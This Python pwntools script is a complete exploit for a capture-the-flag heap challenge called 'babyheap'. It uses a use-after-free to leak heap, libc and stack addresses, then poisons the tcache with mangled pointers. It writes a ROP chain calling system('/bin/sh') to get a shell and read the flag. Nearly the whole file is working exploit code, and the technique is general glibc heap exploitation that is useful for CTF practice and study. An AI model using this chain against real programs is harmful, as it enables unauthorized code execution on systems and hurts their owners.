#!/usr/bin/env python3

# ruff: noqa: F403, F405

from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./babyheap.patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc baby-heap.nc.jctf.pro 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}

# when there is no need for custom env, this should be set to None
# for some reason when we pass empty dictionary to `gdb.debug`, `pwntools` would
# still launch `gdbserver` with `--wrapper env -i` flag which result in the first
# thing to be debugged is `bash` then `env` and finally our target binary
#
# https://github.com/Gallopsled/pwntools/blob/96d98cf192cf1e9bc5d6bbeff5311e8961e58439/pwnlib/gdb.py#L347
# should have checked `len(env_args) > 0` instead of `env is not None`

if len(env) == 0:
    env = None

gdbscript = """
"""


# heap utils BEGIN
def reveal(ptr):
    mask = 0xFFF << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def demangle(pos, ptr):
    return (pos >> 12) ^ ptr


# heap utils END


def create(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Content? Content? ", data)


def read(idx: int) -> bytes:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index? ", str(idx).encode())
    return io.recv(0x30)


def update(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Content? ", data)


def delete(idx: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index? ", str(idx).encode())


io = start()

create(0, b"a")
create(1, b"b")
create(2, b"c")
delete(0)
delete(1)

out = read(0)
heap_leak = u64(out[:8])
# tkey = u64(out[8:16])
heap_base = heap_leak << 12
log.info(f"{heap_base=:#x}")
# log.info(f"{tkey=:#x}")

chunks = heap_base + 0x2A0
# chunks = reveal(u64(read(1)[:8]))
# log.info(f"{chunks=:#x}")

"""
fake chunk 2 is needed to show that fake chunk 1 is in use to prevent forward
consolidation which could throw `corrupted size vs. prev size` error when
freeing fake chunk 3

fake chunk 3 (large)
fake chunk 1
fake chunk 2
"""

# setup fake chunk 1 and 2
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x580)))
create(3, b"e")
create(4, flat(0, 0x21, 0, 0, 0, 0x21))

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

# setup fake chunk 3
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x70)))
create(5, b"f")
create(6, flat(0, 0x511))
# free 2 into unsorted bins
delete(2)

read(2)
libc_leak = u64(read(2)[:8])
libc.address = libc_leak - 0x203B20
log.info(f"{libc.address=:#x}")

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

update(1, p64(mangle(chunks + 1 * 0x30, libc.address + 0x2046D0)))
create(7, b"f")
create(8, p8(0))

stack_leak = u64(read(8)[0x10:0x18])
saved_rbp = stack_leak - 0x148
log.info(f"{stack_leak=:#x}")
log.info(f"{saved_rbp=:#x}")

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

pop_rdi = libc.address + 0x000000000010F75B
bin_sh_string = next(libc.search(b"/bin/sh\x00"))
system_fn = libc.sym["system"]

update(1, p64(mangle(chunks + 1 * 0x30, saved_rbp)))
create(9, b"f")
create(10, flat(heap_base + 0x8000, pop_rdi, bin_sh_string, pop_rdi + 1, system_fn))

io.sendline(b"cat flag.txt")

io.interactive()
